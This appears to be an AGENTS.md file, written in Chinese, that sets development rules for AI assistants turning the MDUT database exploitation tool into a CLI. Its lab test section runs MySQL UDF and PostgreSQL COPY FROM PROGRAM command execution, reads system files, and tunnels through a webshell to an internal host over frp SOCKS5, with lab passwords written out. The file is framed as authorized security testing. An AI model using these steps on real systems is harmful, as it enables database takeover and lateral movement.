# AGENTS.md — AI 协作开发准则（MDUT-CLI）

> 本文件是 AI 助手在本仓库工作的**最高行为准则**。开始任何任务前必须通读；与其它文档冲突时，以本文「硬性约束」为准。
> 方案文档链：[docs/1.现状与差异分析.md](docs/1.现状与差异分析.md)（现状）→ [docs/2.CLI二开实施方案.md](docs/2.CLI二开实施方案.md)（**实施规格 v3，实施以此为准**）→ [docs/附录A.MDUT原版功能分析报告-全量证据.md](docs/附录A.MDUT原版功能分析报告-全量证据.md)（原版功能证据）。
> 集成模式参照：`/opt/GodzillaSuper-cli`（GSL5，同为 GUI 工具 CLI 化 fork，五件套：wrapper / JSON 信封 / 退出码 / 分层 help / SKILL）。

---

## 0. 项目速览

- **MDUT**（Multiple Database Utilization Tools）：原版 v2.1.1 为 JavaFX GUI 数据库利用工具（上游 SafeGroceryStore/MDUT，本仓库 origin = hanc00l/MDUT-cli）。
- 本仓库是 **CLI 化二开**：纯 CLI 单 jar、零 JavaFX 编译依赖、JDK 8 基线、`--task` 隔离、单行 JSON 信封、零配置文件（无 config.yaml）。功能基线对齐上游闭源 v3（MySQL/MSSQL/PostgreSQL/Oracle/Redis：命令执行/文件管理/反弹 Shell），Keep 项：MongoDB、MSSQL potato 系；入站代理仅 SOCKS5（`--proxy`，出站枢轴与 HTTP scheme 已明确取消，见 docs/2 §6）。
- **MCP 不做**；deepstrike 插件适配暂缓（通用集成面 = `cli/mdut` wrapper + `cli/SKILL.md`）。
- CLI 工作全部在 **`cli` 分支**进行，`main` 保持上游镜像不落提交。

---

## 1. 硬性约束（违反即返工）

### 1.1 一切基于 JDK 8

- 全部源码与依赖必须 **JDK 8 字节码兼容**：`maven.compiler.source = 1.8`、`maven.compiler.target = 1.8`。
- **禁用 JDK 9+ 语法与 API**：`var`、switch 表达式、text blocks、record、`List.of/Map.of/Set.of`、`Stream.toList()`、`Files.readString/writeString`、`String.isBlank/strip/repeat/lines`、`Optional.or/ifPresentOrElse`、`Predicate.not`、接口 private 方法等。
- 构建默认 JDK 8（本机 Zulu 8.0.482，`JAVA_HOME` 指向它）；交付物必须通过 JDK 8/11/17/21 **运行**矩阵（见 §4），编译允许在更高 JDK 下进行但 API 兼容性以 JDK 8 为准。
- 新增第三方依赖必须选 JDK 8 兼容版本线（sqlite-jdbc 3.x、jedis 3.x、mongodb-driver-sync 4.x、okhttp/okhttps 3.x 等），并在 pom 注释选型理由；**禁止 `system` scope**。

### 1.2 一律使用 Maven 构建与打包

- **Maven 是唯一构建路径**：`mvn -f MDAT-DEV/pom.xml clean package`。
- 交付物为 **uber-jar（jar-with-dependencies，含全部运行依赖）**，`finalName=mdut`，`Main-Class=cli.CliMain`。
- ⚠️ **与 GSL5 相反的打包边界（必查）**：`Driver/`（JDBC 驱动 jar）、`Plugins/`（载荷资产）、`data.db` 模板、GUI 资源（fxml/images）**一律不得打进产物 jar**——它们是运行期外置资产（jar 同目录解析，docs/2 §10）；驱动经 `Util/DriverLoader` 子加载器动态加载。发布 zip = jar + `cli/mdut` + `cli/SKILL.md` + `Driver/` + `Plugins/`。
- 依赖终态：保留 sqlite-jdbc/org.json/jedis/mongodb-driver-sync/commons-lang/orai18n/commons-codec/okhttps（fastjson 视引用）；**移除** snakeyaml（无 config.yaml）、pegdown、jjwt；`YamlConfigs` 删除。
- 驱动加载只允许 `DriverLoader` 路线（子 `URLClassLoader` + 直接 `Driver#connect`）；**禁止回退** `(URLClassLoader) getSystemClassLoader()` 强转（JDK 9+ 必崩）与 `Utils.regroupDrivers` 排序补丁（已随 DriverManager 路线删除，含其 `"ostgresql"` 拼写 bug）。

### 1.3 纯 CLI 纪律（零 JavaFX）

- CLI 可达源码**零 javafx 引用**：GUI 代码（`main.java`、10 个 Controller、FXML 实体、`MessageUtil`、`UpdateController`）移入 `src/legacy/java` **不参与编译**，保留历史不删除。
- Dao 解耦只允许「换输出口」：`ControllersFactory`/`Platform.runLater`/`TextArea.appendText` → `Reporter`（log/error/result）注入；**业务逻辑（SQL 模板、利用链、文件管道）零改动**——行为差异必须在 PR 描述逐条列明。
- 全源码审计红线：`grep -rE "javafx|javax.swing|MessageUtil|ControllersFactory" MDAT-DEV/src/main/java --include="*.java" | grep -v legacy` 必须为空。

### 1.4 输出契约纪律（Agent 集成第一纪律）

- stdout **恰好一行 JSON 信封**：成功 `{"ok":true,"task":"...","tool":"...","id"?,"text"/业务字段}`；失败 `{"ok":false,"task":"...","tool":"...","error":"...","hint":"可操作建议"}`。**日志一律 stderr**（`[*] yyyy-MM-dd HH:mm:ss - msg` 时间戳格式沿用 `Utils.log()`）。
- **退出码矩阵**：`0` 成功 / `2` 用法错误（未知命令/缺必填/JSON 解析失败）/ `3` 目标连接或执行失败 / `4` 超时 / `5` task 写锁竞争。新增命令必须逐项可触发。
- stdout 纯净化：深层代码的杂散 `System.out.println` 必须改走 Reporter/stderr；`--format text` 模式才允许 `[+]/[-]/[*]` 前缀文本上 stdout。
- 大文件纪律：`download --out <本地路径>` / `upload <本地>` 直存直传，禁止文件内容进上下文；JSON 内嵌 base64 仅限小内容。
- 命令词汇是**表驱动单一事实源**（CommandSpec → help 自动生成）；行为/词汇/构建变更必须同步 docs/2 实施规格 + `cli/SKILL.md`（§5）。**skill 不复制参数级文档**。

### 1.5 task 隔离纪律

- task 语义 = wrapper chdir（`cli/mdut`：`--task` > `$MDUT_TASK` > `default` → `tasks/<task>/`）；data.db 每 task 一库（WAL + busy_timeout=5000）；审计账 `<task>/logs/audit.jsonl` 每命令落账，**不得绕过**。
- wrapper 守卫不得移除：task 名 `[A-Za-z0-9_-]{1,64}`（拒绝 `..`、`/`、`\`）；data.db 符号链接拒判；NFS/CIFS 等网络 fs 拒判（WAL 不安全）。
- **`RedisDao` 的 static 字段（CONN/dir/slaveReadOnlyFlag）改实例字段后不得回潮**——static 是并发正确性红线。

### 1.6 文件编码纪律

- 现状：源码树 UTF-8（中文注释可正常读取）。**新文件一律 UTF-8**；对既有文件的编辑保持其原编码，禁止整文件重编码（避免上游合并冲突）。提交信息：中文、祈使句，前缀标识范围（`cli:` / `dao:` / `docs:` / `build:`）。

---

## 2. 开发工作流（AI 必须遵守）

1. **动手前**：读 docs/ 方案链，确认任务落在 docs/2 v3 实施规格的哪个里程碑（M0–M4）内；对照 §1 硬性约束。
2. **改动最小化**：Dao 解耦遵循「只换输出口」；新逻辑一律进新文件（`cli/`、`Util/DriverLoader`、`Util/JdbcProfiles`、`Reporter`）；`legacy/` 只进不出。
3. **提交纪律**：`cli` 分支原子提交（dao-decouple / cli-core / task-store / wrapper+docs 分开）；tag 规范 `v2.1.1+cli.<序号>`（CHANGELOG 记录）。
4. **禁止事项**：
   - 不提交任何凭据/Token/`data.db`/`tasks/` 任务目录/审计账（运行产物不入库）；
   - 不改 Dao 业务逻辑（SQL 模板、利用链管道）——重构期只换输出口；
   - 不引入新依赖除非任务必需且满足 §1.1/§1.2；
   - 不在无授权目标上验证攻击性功能（本地冒烟只用构造数据/docker 可弃容器）；
   - 不对 mirrorstrike 生产实例（Redis/PG）执行**任何变异操作**（§4.1 TC1/TC2 红线）。
5. **每次改动后的验证义务（缺一不可，全部通过才算完成）**：

```bash
mvn -q -f MDAT-DEV/pom.xml clean package && ls -lh MDAT-DEV/target/mdut.jar   # 构建成功
java -jar MDAT-DEV/target/mdut.jar version                                    # 单行 JSON 信封
java -jar MDAT-DEV/target/mdut.jar doctor                                     # 自检（M2 后）
unzip -l MDAT-DEV/target/mdut.jar | grep -cE "org/sqlite/|redis/clients/|com/mongodb/"   # 依赖齐（>0）
! unzip -l MDAT-DEV/target/mdut.jar | grep -qE "javafx|^\s*[0-9]+.*\s(Driver|Plugins)/|\.fxml"  # 无 javafx/无外置资产/GUI 资源（0 命中）
```

   触及 `cli/`（CliMain/Args/Envelope/ConnectionStore）时另跑 `cli/tests/` golden 回归（M2 后可用）；JDK 运行矩阵（8/11/17/21）在 M4 前必须全绿。

---

## 3. Maven 构建基线（pom.xml 必须满足）

```xml
<!-- 关键基线（非完整 pom） -->
<properties>
  <maven.compiler.source>1.8</maven.compiler.source>
  <maven.compiler.target>1.8</maven.compiler.target>
  <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
</properties>
<!-- build：assembly jar-with-dependencies（finalName=mdut，archive Main-Class=cli.CliMain）；
     编译排除 src/legacy/java（GUI 历史代码，不编译不打包）；
    surefire 挂 JUnit 单测；依赖瘦身见 §1.2；
     ⚠️ Driver/、Plugins/、data.db 不是 Maven resources，天然不进 jar——
     若未来把它们挪进 resources 目录视为违约（§1.2 打包边界） -->
```

**uber-jar 验收清单**：① 第三方包在 jar 内（验证命令 grep 命中）；② **外置资产不在 jar 内**（`Driver/`、`Plugins/`、`*.fxml` 零命中）；③ `java -jar` 冒烟：`version`（单行 JSON）/ `doctor`（M2 后）/ 无参（打印用法 + 免责，退出码 2）；④ `java -version` 为 1.8 时全流程可复现。

---

## 4. 测试与验收

- 一致性回归（`cli/tests/`，M2 后）：信封 golden 快照（给定 argv → 断言 JSON 形状与退出码）、task 解析矩阵（缺省→`default` / `--task` / `$MDUT_TASK` / flag 覆盖 env）、退出码矩阵逐项可触发、help 与 CommandSpec 表一致性（表驱动即文档，无第二份描述）。
- **新增能力必须附带可执行验收命令**写入 docs/ 或 SKILL.md；无验收命令的功能视为未完成。
- 测试纪律：**失败即失败**——禁止跳过、注释用例或伪造输出代替执行；实验室环境不可达时如实记录 `BLOCKED: 环境不可达` 并说明原因。

### 4.1 实验室验收测试用例（改造完成后必测）

> **授权前提**：TC1/TC2 使用本机 mirrorstrike 实例（`/opt/mirrorstrike/configs/server.yaml`），TC3 用本机 docker 可弃容器，TC4 仅存在于授权实验室拓扑（`192.168.52.0/24` 攻击入口区、`172.31.0.0/24` 内网区）。执行前必须确认当前作业属于该授权范围。

**TC1 — 本机 Redis（mirrorstrike 实例，非破坏）**

> 配置来源 `server.yaml` redis 节：`127.0.0.1:6379`，密码 `mirrorstrike`。
> ⚠️ **红线**：该实例是 mirrorStrike 的状态存储，**禁止执行 crontab/sshkey/rdb/exec/revshell 等任何写文件或加载模块的变异操作**——变异类 Redis 用例用 docker `redis:4.0.14` 可弃容器另测（TC1-R，用例同 TC1 步骤 2 后追加 crontab→clean，判定容器内 `/var/spool/cron/` 落写后被 clean 恢复）。

| 步骤 | 命令/动作 | 判定 |
|---|---|---|
| 1 | `./cli/mdut --task lab-tc1 add redis --host 127.0.0.1 --port 6379 --pass mirrorstrike` | 退出码 0；信封含 `"id"` |
| 2 | `./cli/mdut --task lab-tc1 info --id <ID>` | 返回 `redis_version`/`os`/`arch_bits`；附带 CVE 扫描行；认证生效（漏 `--pass` 时应退出码 3，error 含 NOAUTH/denied） |
| 3 | `./cli/mdut --task lab-tc1 list` | 表格含该连接；信封 task 字段为 `lab-tc1` |
| 4 | `./cli/mdut --task lab-tc1 delete <ID>` → `list` | 退出码 0；列表不再包含 |

**TC2 — 本机 PostgreSQL（mirrorstrike 实例，只读为主）**

> 配置来源 `server.yaml` postgres 节：`127.0.0.1:5432`，`postgres`/`mirrorstrike`，库 `mirrorstrike`，sslmode disable（pg JDBC 默认不启用 SSL，URL 模板兼容）。

| 步骤 | 命令/动作 | 判定 |
|---|---|---|
| 1 | `./cli/mdut --task lab-tc2 add postgresql --host 127.0.0.1 --port 5432 --user postgres --pass mirrorstrike --db mirrorstrike` | 退出码 0 + `"id"` |
| 2 | `./cli/mdut --task lab-tc2 info --id <ID>` | 版本 + 路线分档（mirrorstrike PG 预期 ≥9.3 → `cve`） |
| 3 | `./cli/mdut --task lab-tc2 --sql --id <ID> "select version()"` | 版本行回显 |
| 4 | `./cli/mdut --task lab-tc2 list-files --id <ID> /var/run` | pg_ls_dir 目录清单（只读） |
| 5 | `./cli/mdut --task lab-tc2 read --id <ID> /etc/hostname` | 文件内容回显（PG11+ superuser 可读任意路径；旧版改读 `<PGDATA>/postgresql.conf`） |
| 6 | （可选·变异）`exec --id <ID> 'id'` → `clean --id <ID>` | cve 路线 COPY FROM PROGRAM 回显 uid；clean 幂等成功；mirrorstrike 库无残留表/函数（`\df` 查证） |
| 7 | `./cli/mdut --task lab-tc2 delete <ID>` | 退出码 0 |

**TC3 — MySQL 基线 + UDF 全链（docker 可弃容器）**

> ⚠️ UDF 部署是变异操作，**必须用可弃容器**，勿对任何共享实例执行。`--secure-file-priv=` 置空是 UDF 落盘成立的关键（MySQL 5.7 默认 `/var/lib/mysql-files` 会拦 `INTO DUMPFILE` 写 plugin 目录）。

| 步骤 | 命令/动作 | 判定 |
|---|---|---|
| 1 | `docker run -d --name mdut-mysql -e MYSQL_ROOT_PASSWORD=123456 -p 13306:3306 mysql:5.7 --secure-file-priv=` | 容器 healthy |
| 2 | `./cli/mdut --task lab-tc3 add mysql --host 127.0.0.1 --port 13306 --user root --pass 123456 --db mysql` | 退出码 0 + `"id"` |
| 3 | `./cli/mdut --task lab-tc3 info --id <ID>` | `MySQL 5.7.x` / Linux 64 / UDF 路径 `/usr/lib/mysql/plugin/` |
| 4 | `./cli/mdut --task lab-tc3 exec --id <ID> 'id'` | 首次触发 UDF 部署链（探测→落盘→建函数）→ 回显 `uid=0(root)` |
| 5 | `./cli/mdut --task lab-tc3 exec --id <ID> 'whoami'` → `--sql --id <ID> "select LOAD_FILE('/etc/hostname')"` | 二次调用直接回显；LOAD_FILE 返回容器主机名 |
| 6 | `./cli/mdut --task lab-tc3 clean --id <ID>` | 退出码 0；容器内查证：`docker exec mdut-mysql mysql -uroot -p123456 -e "select * from mysql.func"` 为空、`ls /usr/lib/mysql/plugin/` 无 `.temp` 遗留 |
| 7 | `./cli/mdut --task lab-tc3 delete <ID>`；`docker rm -f mdut-mysql`；删 `tasks/lab-tc3` | 资源清零 |

**TC4 — SOCKS5 入站代理 + 内网 MySQL（授权实验室拓扑，改编自 GSL5 TC2/TC3）**

> 拓扑：攻击机 192.168.52.103；入口壳机 172.31.0.10（双网卡，已获 WebShell——可复用 GSL5 TC1 的壳）；内网 MySQL 172.31.0.20:3306（root/123456，与 GSL5 TC2 同靶）。隧道走 frp socks5（GSL5 TC3 步骤 1–4 复用：本机 frps bindPort 7000 → 壳 A 上传 frpc + `plugin socks5, remotePort=1080` → `curl --socks5-hostname 127.0.0.1:1080 ...` 贯通）。

| 步骤 | 命令/动作 | 判定 |
|---|---|---|
| 1 | 建立隧道（frps/frpc），`curl --socks5-hostname 127.0.0.1:1080 -sI http://172.31.0.10:8080/` | HTTP 200/30x，隧道贯通 |
| 2 | **负控制**（无代理直连）：`./cli/mdut --task lab-tc4 add mysql --host 172.31.0.20 --port 3306 --user root --pass 123456` | 退出码 3；error 含 `NoRouteToHost`/`timeout`；**hint 提示使用 `--proxy`**（deepstrike 用例 2 教训的对位验收） |
| 3 | `./cli/mdut --task lab-tc4 --proxy socks5://127.0.0.1:1080 add mysql --host 172.31.0.20 --port 3306 --user root --pass 123456 --db mysql` | 退出码 0 + `"id"`；frps 日志/壳 A `ss -tnp` 见 1080 流量（证明走代理而非直连） |
| 4 | `info` → `exec --id <ID> 'id'` | 版本回显；UDF 链（落盘/建函数/执行）**全程经代理**跑通，回显 `uid=` |
| 5 | `clean` → `delete` → 删 `tasks/lab-tc4` | 查证 mysql.func 空且无 .temp；资源清零 |

**清理义务**：每条 TC 结束后删除入口 shell/frpc 进程与文件、停 frps、删对应 `tasks/<task>/`（含 data.db 与审计账），并在任务记录留痕。**TC4 追加**：壳 A 上删除 frpc 二进制与配置（参照 GSL5 TC3 教训：Tomcat 场景删 shell 需同删 `work/` 编译缓存）。

---

## 5. 文档同步义务

- 行为/CLI 词汇/构建流程变更，必须同步：[docs/2.CLI二开实施方案.md](docs/2.CLI二开实施方案.md)（实施规格）、`docs/3.CLI命令面规格.md`（M0 冻结后）与 `cli/SKILL.md`（工具手册）。
- 命令词汇以 `cli/SKILL.md` + CommandSpec 表为单一事实源：**SKILL.md 不复制参数级文档**，参数靠 `mdut --help` / `mdut help <command>` 实时自省。
- deepstrike 侧适配材料沉淀在 `docs/4.deepstrike迁移指南.md`（暂缓实现，仅交接参考）。

## 6. 安全与合规

- 本工具仅供**授权**安全测试与研究；数据库利用/提权/文件操作能力不得用于未授权目标（沿用上游免责声明）。
- 审计是刚需：不得提交绕过审计日志（`logs/audit.jsonl`）的代码路径。
- `data.db` 明文存储连接凭据（现状继承，docs/2 §12-R9）——不提交、不外发任务目录；共享/发布产物前检查不含本地敏感文件（`data.db`、`tasks/`、token）。
- 对 mirrorstrike 等共享基础设施实例：只允许非破坏验证（TC1/TC2 步骤即红线清单）；变异类用例一律 docker 可弃容器。
